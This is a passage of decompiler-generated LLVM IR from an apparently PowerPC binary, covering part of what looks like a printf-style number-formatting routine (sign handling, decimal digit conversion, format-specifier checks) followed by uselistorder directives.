  %v2_1000a64c = inttoptr i32 %v1_1000a64c to i32*
  store i32 %v0_1000a64c, i32* %v2_1000a64c, align 4
  %v0_1000a650 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a650 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a650 = add i32 %v1_1000a650, 8
  %v3_1000a650 = inttoptr i32 %v2_1000a650 to i32*
  store i32 %v0_1000a650, i32* %v3_1000a650, align 4
  %v0_1000a654 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a654 = add i32 %v0_1000a654, 12
  store i32 %v1_1000a654, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a658

dec_label_pc_1000a658:                            ; preds = %dec_label_pc_1000a630, %dec_label_pc_1000a638
  %v1_1000a664 = phi i32 [ %v1_1000a640, %dec_label_pc_1000a630 ], [ %v1_1000a654, %dec_label_pc_1000a638 ]
  %v0_1000a658 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a658 = icmp slt i32 %v0_1000a658, 0
  %v3_1000a658 = icmp eq i32 %v0_1000a658, 0
  store i1 %v1_1000a658, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a658, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a658, label %dec_label_pc_1000a674, label %dec_label_pc_1000a660

dec_label_pc_1000a660:                            ; preds = %dec_label_pc_1000a658
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_1000a664 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a664 = add i32 %v1_1000a664, 8
  %v3_1000a664 = inttoptr i32 %v2_1000a664 to i32*
  store i32 %v0_1000a664, i32* %v3_1000a664, align 4
  %v0_1000a668 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a668 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a668 = inttoptr i32 %v1_1000a668 to i32*
  store i32 %v0_1000a668, i32* %v2_1000a668, align 4
  %v0_1000a66c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a66c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a66c = add i32 %v1_1000a66c, 4
  %v3_1000a66c = inttoptr i32 %v2_1000a66c to i32*
  store i32 %v0_1000a66c, i32* %v3_1000a66c, align 4
  %v0_1000a670 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a670 = add i32 %v0_1000a670, 12
  store i32 %v1_1000a670, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a674

dec_label_pc_1000a674:                            ; preds = %dec_label_pc_1000a658, %dec_label_pc_1000a660
  %v1_1000a69c = phi i32 [ %v1_1000a664, %dec_label_pc_1000a658 ], [ %v1_1000a670, %dec_label_pc_1000a660 ]
  %v0_1000a674 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a674 = icmp slt i32 %v0_1000a674, 103
  %v3_1000a674 = icmp eq i32 %v0_1000a674, 103
  store i1 %v1_1000a674, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a674, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a674, label %dec_label_pc_1000a67c, label %dec_label_pc_1000a688

dec_label_pc_1000a67c:                            ; preds = %dec_label_pc_1000a674
  %v3_1000a67c = load i32, i32* %v2_1000a1bc, align 4
  store i32 %v3_1000a67c, i32* %r0.global-to-local, align 4
  %v1_1000a680 = and i32 %v3_1000a67c, 16
  store i32 %v1_1000a680, i32* %r9.global-to-local, align 4
  %v3_1000a680 = icmp eq i32 %v1_1000a680, 0
  br i1 %v3_1000a680, label %dec_label_pc_1000a6b4, label %dec_label_pc_1000a688

dec_label_pc_1000a688:                            ; preds = %dec_label_pc_1000a674, %dec_label_pc_1000a67c
  %v0_1000a688 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a688 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000a688 = sub i32 %v1_1000a688, %v0_1000a688
  store i32 %v2_1000a688, i32* %r9.global-to-local, align 4
  %v1_1000a68c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a68c = icmp sgt i32 %v1_1000a68c, %v2_1000a688
  %v4_1000a68c = icmp eq i32 %v1_1000a68c, %v2_1000a688
  store i1 %v2_1000a68c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a68c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000a68c, label %dec_label_pc_1000a694, label %dec_label_pc_1000a6b4

dec_label_pc_1000a694:                            ; preds = %dec_label_pc_1000a688
  %v2_1000a694 = sub i32 %v1_1000a68c, %v2_1000a688
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000a69c = add i32 %v1_1000a69c, 4
  %v3_1000a69c = inttoptr i32 %v2_1000a69c to i32*
  store i32 %v2_1000a694, i32* %v3_1000a69c, align 4
  store i32 ptrtoint (i32* @global_var_1000f843.305 to i32), i32* %r9.global-to-local, align 4
  %v0_1000a6a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a6a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a6a8 = inttoptr i32 %v1_1000a6a8 to i32*
  store i32 %v0_1000a6a8, i32* %v2_1000a6a8, align 4
  %v0_1000a6ac = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a6ac = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a6ac = add i32 %v1_1000a6ac, 8
  %v3_1000a6ac = inttoptr i32 %v2_1000a6ac to i32*
  store i32 %v0_1000a6ac, i32* %v3_1000a6ac, align 4
  %v0_1000a6b0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a6b0 = add i32 %v0_1000a6b0, 12
  store i32 %v1_1000a6b0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a6b4

dec_label_pc_1000a6b4:                            ; preds = %dec_label_pc_1000a688, %dec_label_pc_1000a67c, %dec_label_pc_1000a694
  %v1_1000a74837 = phi i32 [ %v1_1000a69c, %dec_label_pc_1000a688 ], [ %v1_1000a69c, %dec_label_pc_1000a67c ], [ %v1_1000a6b0, %dec_label_pc_1000a694 ]
  %v0_1000a6b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a6b4 = icmp slt i32 %v0_1000a6b4, 102
  %v3_1000a6b4 = icmp eq i32 %v0_1000a6b4, 102
  store i1 %v1_1000a6b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a6b4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a6b4, label %dec_label_pc_1000a73c, label %dec_label_pc_1000a6bc

dec_label_pc_1000a6bc:                            ; preds = %dec_label_pc_1000a6b4
  %v0_1000a6bc = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a6bc = icmp slt i32 %v0_1000a6bc, 0
  %v3_1000a6bc = icmp eq i32 %v0_1000a6bc, 0
  store i1 %v1_1000a6bc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a6bc, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a6bc, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_1000a6bc, -1
  br i1 %tmp80, label %dec_label_pc_1000a6d8, label %dec_label_pc_1000a6d0

dec_label_pc_1000a6d0:                            ; preds = %dec_label_pc_1000a6bc
  %v1_1000a6d0 = sub i32 0, %v0_1000a6bc
  store i32 %v1_1000a6d0, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a6d8

dec_label_pc_1000a6d8:                            ; preds = %dec_label_pc_1000a6bc, %dec_label_pc_1000a6d0
  %v0_1000a6ec31 = phi i32 [ %v0_1000a6bc, %dec_label_pc_1000a6bc ], [ %v1_1000a6d0, %dec_label_pc_1000a6d0 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000a6dc = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_1000a6dc, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000a6ec

dec_label_pc_1000a6ec:                            ; preds = %dec_label_pc_1000a6ec.backedge, %dec_label_pc_1000a6d8
  %v2_1000a70c = phi i32 [ %v3_1000a70c, %dec_label_pc_1000a6ec.backedge ], [ %v2_1000a6dc, %dec_label_pc_1000a6d8 ]
  %v0_1000a6f0 = phi i32 [ %v0_1000a6f0.pre, %dec_label_pc_1000a6ec.backedge ], [ 2, %dec_label_pc_1000a6d8 ]
  %v1_1000a6ec = phi i32 [ %v1_1000a6ec.pre, %dec_label_pc_1000a6ec.backedge ], [ 10, %dec_label_pc_1000a6d8 ]
  %v1_1000a700 = phi i32 [ %v0_1000a6ec.pre, %dec_label_pc_1000a6ec.backedge ], [ %v0_1000a6ec31, %dec_label_pc_1000a6d8 ]
  %v2_1000a6ec = sdiv i32 %v1_1000a700, %v1_1000a6ec
  store i32 %v2_1000a6ec, i32* %r0.global-to-local, align 4
  %v1_1000a6f0 = add i32 %v0_1000a6f0, 1
  store i32 %v1_1000a6f0, i32* %r7.global-to-local, align 4
  %v1_1000a6f4 = icmp slt i32 %v1_1000a6f0, 3
  %v3_1000a6f4 = icmp eq i32 %v1_1000a6f0, 3
  store i1 %v1_1000a6f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a6f4, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a6fc = icmp slt i32 %v2_1000a6ec, 0
  %v2_1000a6fc = icmp sgt i32 %v2_1000a6ec, 0
  %v3_1000a6fc = icmp eq i32 %v2_1000a6ec, 0
  store i1 %v1_1000a6fc, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000a6fc, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000a6fc, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_1000a6ec, -10
  store i32 %v2_1000a6ec, i32* %r11.global-to-local, align 4
  %v2_1000a700 = add i32 %v1_1000a700, 48
  %v1_1000a708 = add i32 %v2_1000a700, %tmp81
  store i32 %v1_1000a708, i32* %r9.global-to-local, align 4
  %v1_1000a70c = trunc i32 %v1_1000a708 to i8
  %v3_1000a70c = add i32 %v2_1000a70c, -1
  %v4_1000a70c = inttoptr i32 %v3_1000a70c to i8*
  store i8 %v1_1000a70c, i8* %v4_1000a70c, align 1
  store i32 %v3_1000a70c, i32* %r10.global-to-local, align 4
  %v0_1000a710 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a710 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000a710 = or i1 %v0_1000a710, %v1_1000a710
  br i1 %v2_1000a710, label %dec_label_pc_1000a6ec.backedge, label %dec_label_pc_1000a714

dec_label_pc_1000a6ec.backedge:                   ; preds = %dec_label_pc_1000a6ec, %dec_label_pc_1000a714
  %v0_1000a6ec.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a6ec.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000a6f0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000a6ec

dec_label_pc_1000a714:                            ; preds = %dec_label_pc_1000a6ec
  %v0_1000a714 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000a714, label %dec_label_pc_1000a718, label %dec_label_pc_1000a6ec.backedge

dec_label_pc_1000a718:                            ; preds = %dec_label_pc_1000a714
  %v1_1000a718 = add i32 %v2_1000a70c, -2
  store i32 %v1_1000a718, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1000a720 = add i32 %v2_1000a70c, -3
  store i32 %v1_1000a720, i32* %r11.global-to-local, align 4
  %v0_1000a724 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a724 = trunc i32 %v0_1000a724 to i8
  %v4_1000a724 = inttoptr i32 %v1_1000a718 to i8*
  store i8 %v1_1000a724, i8* %v4_1000a724, align 1
  %v0_1000a728 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a728 = trunc i32 %v0_1000a728 to i8
  %v2_1000a728 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a728 = add i32 %v2_1000a728, -1
  %v4_1000a728 = inttoptr i32 %v3_1000a728 to i8*
  store i8 %v1_1000a728, i8* %v4_1000a728, align 1
  %v0_1000a72c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a72c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a72c = inttoptr i32 %v1_1000a72c to i32*
  store i32 %v0_1000a72c, i32* %v2_1000a72c, align 4
  %v0_1000a730 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a730 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a730 = add i32 %v1_1000a730, 4
  %v3_1000a730 = inttoptr i32 %v2_1000a730 to i32*
  store i32 %v0_1000a730, i32* %v3_1000a730, align 4
  %v0_1000a734 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a734 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a734 = add i32 %v1_1000a734, 8
  %v3_1000a734 = inttoptr i32 %v2_1000a734 to i32*
  store i32 %v0_1000a734, i32* %v3_1000a734, align 4
  %v0_1000a738 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a738 = add i32 %v0_1000a738, 12
  store i32 %v1_1000a738, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a73c

dec_label_pc_1000a73c:                            ; preds = %dec_label_pc_1000a6b4, %dec_label_pc_1000a290, %dec_label_pc_1000a718
  %v0_1000a7b8 = phi i32 [ %v1_1000a74837, %dec_label_pc_1000a6b4 ], [ %v2_1000a29c, %dec_label_pc_1000a290 ], [ %v1_1000a738, %dec_label_pc_1000a718 ]
  %v2_1000a73c = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_1000a73c, i32* %r9.global-to-local, align 4
  %v1_1000a74c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a740

dec_label_pc_1000a740:                            ; preds = %dec_label_pc_1000a740, %dec_label_pc_1000a73c
  %v1_1000a74c = phi i32 [ %v2_1000a74c, %dec_label_pc_1000a740 ], [ %v1_1000a74c.pre, %dec_label_pc_1000a73c ]
  %v0_1000a740 = phi i32 [ %v1_1000a744, %dec_label_pc_1000a740 ], [ %v2_1000a73c, %dec_label_pc_1000a73c ]
  %v1_1000a740 = inttoptr i32 %v0_1000a740 to i32*
  %v2_1000a740 = load i32, i32* %v1_1000a740, align 4
  store i32 %v2_1000a740, i32* %r0.global-to-local, align 4
  %v1_1000a744 = add i32 %v0_1000a740, 12
  store i32 %v1_1000a744, i32* %r9.global-to-local, align 4
  %v2_1000a748 = icmp ult i32 %v1_1000a744, %v0_1000a7b8
  %v2_1000a74c = sub i32 %v1_1000a74c, %v2_1000a740
  store i32 %v2_1000a74c, i32* @r28, align 4
  br i1 %v2_1000a748, label %dec_label_pc_1000a740, label %dec_label_pc_1000a754

dec_label_pc_1000a754:                            ; preds = %dec_label_pc_1000a740
  %v4_1000a748 = icmp eq i32 %v1_1000a744, %v0_1000a7b8
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a748, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a754 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_1000a7b8, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_1000a754, 0
  %v1_1000a768 = zext i1 %tmp85 to i32
  store i32 %v1_1000a768, i32* %r9.global-to-local, align 4
  %v2_1000a76c = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_1000a76c, i32* %r0.global-to-local, align 4
  %v2_1000a770 = sub i32 %v2_1000a74c, %v1_1000a768
  store i32 %v2_1000a770, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_1000a770, 1
  br i1 %tmp82, label %dec_label_pc_1000a7dc, label %dec_label_pc_1000a780

dec_label_pc_1000a780:                            ; preds = %dec_label_pc_1000a754
  %v3_1000a780 = load i32, i32* %v2_1000a1bc, align 4
  store i32 %v3_1000a780, i32* %r0.global-to-local, align 4
  %v1_1000a784 = and i32 %v3_1000a780, 8
  store i32 %v1_1000a784, i32* %r7.global-to-local, align 4
  %v3_1000a784 = icmp eq i32 %v1_1000a784, 0
  br i1 %v3_1000a784, label %dec_label_pc_1000a7a8, label %dec_label_pc_1000a78c

dec_label_pc_1000a78c:                            ; preds = %dec_label_pc_1000a780
  %v1_1000a790 = add i32 %v0_1000a7b8, 12
  store i32 %v1_1000a790, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1000f843.305 to i32), i32* %r9.global-to-local, align 4
  %v2_1000a798 = inttoptr i32 %v0_1000a7b8 to i32*
  store i32 160, i32* %v2_1000a798, align 4
  %v0_1000a79c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a79c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a79c = add i32 %v1_1000a79c, 4
  %v3_1000a79c = inttoptr i32 %v2_1000a79c to i32*
  store i32 %v0_1000a79c, i32* %v3_1000a79c, align 4
  %v0_1000a7a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a7a0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a7a0 = add i32 %v1_1000a7a0, 8
  %v3_1000a7a0 = inttoptr i32 %v2_1000a7a0 to i32*
  store i32 %v0_1000a7a0, i32* %v3_1000a7a0, align 4
  br label %dec_label_pc_1000a7dc

dec_label_pc_1000a7a8:                            ; preds = %dec_label_pc_1000a780
  %v1_1000a7a8 = add i32 %tmp, 16
  %v2_1000a7a8 = inttoptr i32 %v1_1000a7a8 to i32*
  %v3_1000a7a8 = load i32, i32* %v2_1000a7a8, align 4
  store i32 %v3_1000a7a8, i32* %r0.global-to-local, align 4
  %v1_1000a7ac = icmp slt i32 %v3_1000a7a8, 48
  %v3_1000a7ac = icmp eq i32 %v3_1000a7a8, 48
  store i1 %v1_1000a7ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a7ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a7ac, label %dec_label_pc_1000a7b4, label %dec_label_pc_1000a7d0

dec_label_pc_1000a7b4:                            ; preds = %dec_label_pc_1000a7a8
  %v3_1000a7b4 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_1000a7b8, i32* @r30, align 4
  %v2_1000a7bc = add i32 %v3_1000a7b4, %v2_1000a770
  store i32 %v2_1000a7bc, i32* %r0.global-to-local, align 4
  store i32 %v2_1000a7bc, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1000a7dc

dec_label_pc_1000a7c8:                            ; preds = %dec_label_pc_1000a7e4
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_1000a818

dec_label_pc_1000a7d0:                            ; preds = %dec_label_pc_1000a7a8
  store i32 %v2_1000a74c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a7b8, i32* @r30, align 4
  br label %dec_label_pc_1000a7dc

dec_label_pc_1000a7dc:                            ; preds = %dec_label_pc_1000a754, %dec_label_pc_1000a7b4, %dec_label_pc_1000a78c, %dec_label_pc_1000a7d0
  store i32 0, i32* @r29, align 4
  %v2_1000a7e0 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1000a7e0, i32* @r31, align 4
  br label %dec_label_pc_1000a7e4

dec_label_pc_1000a7e4:                            ; preds = %dec_label_pc_1000a814, %dec_label_pc_1000a7dc
  %v0_1000a7f4 = phi i32 [ %v1_1000a800, %dec_label_pc_1000a814 ], [ %v2_1000a7e0, %dec_label_pc_1000a7dc ]
  %v1_1000a7e4 = inttoptr i32 %v0_1000a7f4 to i32*
  %v2_1000a7e4 = load i32, i32* %v1_1000a7e4, align 4
  store i32 %v2_1000a7e4, i32* %r4.global-to-local, align 4
  %v0_1000a7e8 = load i32, i32* @r27, align 4
  store i32 %v0_1000a7e8, i32* %r3.global-to-local, align 4
  %v1_1000a7ec = add i32 %v0_1000a7f4, 4
  %v2_1000a7ec = inttoptr i32 %v1_1000a7ec to i32*
  %v3_1000a7ec = load i32, i32* %v2_1000a7ec, align 4
  store i32 %v3_1000a7ec, i32* %r5.global-to-local, align 4
  %v0_1000a7f0 = load i32, i32* @r26, align 4
  store i32 %v0_1000a7f0, i32* %ctr.global-to-local, align 4
  %v1_1000a7f4 = add i32 %v0_1000a7f4, 8
  %v2_1000a7f4 = inttoptr i32 %v1_1000a7f4 to i32*
  %v3_1000a7f4 = load i32, i32* %v2_1000a7f4, align 4
  store i32 %v3_1000a7f4, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000a7f0)
  %v0_1000a7fc = load i32, i32* @r31, align 4
  %v1_1000a7fc = add i32 %v0_1000a7fc, 4
  %v2_1000a7fc = inttoptr i32 %v1_1000a7fc to i32*
  %v3_1000a7fc = load i32, i32* %v2_1000a7fc, align 4
  store i32 %v3_1000a7fc, i32* %r0.global-to-local, align 4
  %v1_1000a800 = add i32 %v0_1000a7fc, 12
  store i32 %v1_1000a800, i32* @r31, align 4
  %v0_1000a804 = load i32, i32* @r29, align 4
  %v1_1000a804 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000a804 = add i32 %v1_1000a804, %v0_1000a804
  store i32 %v2_1000a804, i32* @r29, align 4
  %v1_1000a808 = load i32, i32* @r30, align 4
  %v2_1000a808 = icmp ult i32 %v1_1000a800, %v1_1000a808
  %v3_1000a808 = icmp ugt i32 %v1_1000a800, %v1_1000a808
  %v4_1000a808 = icmp eq i32 %v1_1000a800, %v1_1000a808
  store i1 %v2_1000a808, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_1000a808, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_1000a808, i1* %cr6_eq.global-to-local, align 1
  %v2_1000a80c = icmp slt i32 %v1_1000a804, %v3_1000a7fc
  %v4_1000a80c = icmp eq i32 %v1_1000a804, %v3_1000a7fc
  store i1 %v2_1000a80c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a80c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000a80c, label %dec_label_pc_1000a814, label %dec_label_pc_1000a7c8

dec_label_pc_1000a814:                            ; preds = %dec_label_pc_1000a7e4
  br i1 %v2_1000a808, label %dec_label_pc_1000a7e4, label %dec_label_pc_1000a818

dec_label_pc_1000a818:                            ; preds = %dec_label_pc_1000a814, %dec_label_pc_1000a7c8
  %v0_1000a81c = phi i32 [ -1, %dec_label_pc_1000a7c8 ], [ %v2_1000a804, %dec_label_pc_1000a814 ]
  store i32 %v0_1000a170, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a81c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a81c

; uselistorder directives
  uselistorder i32 %v0_1000a81c, { 1, 0 }
  uselistorder i32 %v1_1000a804, { 2, 1, 0 }
  uselistorder i32 %v1_1000a800, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v3_1000a7fc, { 1, 0, 2 }
  uselistorder i32 %v0_1000a7f4, { 0, 2, 1 }
  uselistorder i32 %v3_1000a7a8, { 1, 0, 2 }
  uselistorder i32 %v1_1000a768, { 1, 0 }
  uselistorder i32 %v2_1000a74c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000a744, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000a740, { 1, 0 }
  uselistorder i32 %v0_1000a7b8, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_1000a70c, { 1, 2, 0 }
  uselistorder i32 %v1_1000a6f0, { 1, 0, 2 }
  uselistorder i32 %v2_1000a6ec, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_1000a6bc, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_1000a68c, { 2, 0, 1 }
  uselistorder i32 %v2_1000a688, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000a5f8, { 1, 0 }
  uselistorder i32 %v2_1000a560, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1000a530, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_1000a4f8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000a4f0, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_1000a4bc, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_1000a4ac, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1000a4a0, { 1, 0, 2 }
  uselistorder i32 %v1_1000a484, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1000a43c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1000a42c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000a410, { 1, 0 }
  uselistorder i32 %v1_1000a3ec, { 1, 0 }
  uselistorder i32 %v2_1000a3cc, { 1, 0, 2 }
  uselistorder i32 %v0_1000a374, { 1, 0 }
  uselistorder i32 %v1_1000a1d8, { 1, 0 }
  uselistorder i32 %v0_1000a268, { 2, 1, 0 }
  uselistorder i32 %v1_1000a1ac, { 1, 0 }
  uselistorder i32 %v1_1000a194, { 1, 0, 2 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5, 6 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 21, 22, 19, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r8.global-to-local, { 31, 32, 0, 8, 9, 10, 11, 1, 12, 13, 14, 2, 15, 16, 17, 3, 18, 19, 20, 4, 21, 22, 23, 5, 6, 7, 24, 26, 25, 27, 28, 29, 30, 33 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 9, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 9, 10, 11, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1000f840.303 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7dc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a73c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a6ec.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a6d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a6b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a688, { 1, 0 }
  uselistorder label %dec_label_pc_1000a674, { 1, 0 }
  uselistorder label %dec_label_pc_1000a658, { 1, 0 }
  uselistorder label %dec_label_pc_1000a630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a610, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a5ec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000a5d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a540, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a4dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a49c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a460, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a434, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000a414, { 1, 0 }
